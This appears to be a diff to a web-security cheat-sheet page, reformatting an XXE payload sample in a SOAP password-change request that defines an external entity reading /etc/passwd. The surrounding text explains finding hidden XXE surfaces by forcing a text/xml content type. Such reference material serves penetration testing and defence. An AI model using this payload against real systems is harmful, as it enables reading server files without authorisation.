@@ -1353,13 +1353,17 @@ When the attacker has no control of the whole document, i.e. can't define the DO
 <p><strong>Content Type</strong>
 Some hidden XXE surface can be found by forcing the content type header in the request to be <code>text/xml</code>; some web server or application could be processing the XML passed in the body.</p>
 <p><strong>Soap Envelope</strong></p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM</span>
-<span class="cp">&ldquo;fle//etc/passwd"&gt;</span>]&gt;<span class="nt">&lt;soapenv:Envelope</span>
-<span class="na">xmlns:soapenv=</span><span class="s">"attacker.net"</span><span class="nt">&gt;&lt;soapenv:Header</span>
-<span class="nt">/&gt;&lt;soapenv:Body&gt;&lt;changeUserPassword&gt;&lt;usermname&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;</span>
-<span class="nt">Jusername&gt;&lt;curpwd&gt;</span>abcdef<span class="nt">&lt;/curpwd&gt;&lt;newpwd&gt;</span>abedef<span class="nt">&lt;</span>
-<span class="nt">/newpwd&gt;&lt;/changeUserPassword&gt;&lt;/soapenv:Body&gt;&lt;</span>
-<span class="nt">/soapenv:Envelope&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
+<span class="nt">&lt;soapenv:Envelope</span><span class="w"> </span><span class="na">xmlns:soapenv=</span><span class="s">"attacker.net"</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;soapenv:Header/&gt;</span>
+<span class="w">    </span><span class="nt">&lt;soapenv:Body&gt;</span>
+<span class="w">            </span><span class="nt">&lt;changeUserPassword&gt;&lt;usermname&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/username&gt;</span>
+<span class="w">                </span><span class="nt">&lt;curpwd&gt;</span>abcdef<span class="nt">&lt;/curpwd&gt;</span>
+<span class="w">                </span><span class="nt">&lt;newpwd&gt;</span>abedef<span class="nt">&lt;/newpwd&gt;</span>
+<span class="w">            </span><span class="nt">&lt;/changeUserPassword&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/soapenv:Body&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/soapenv:Envelope&gt;</span>
 </code></pre></div>
 <h2 id="request-smuggling">Request Smuggling</h2>
 <h3 id="http11">HTTP/1.1</h3>
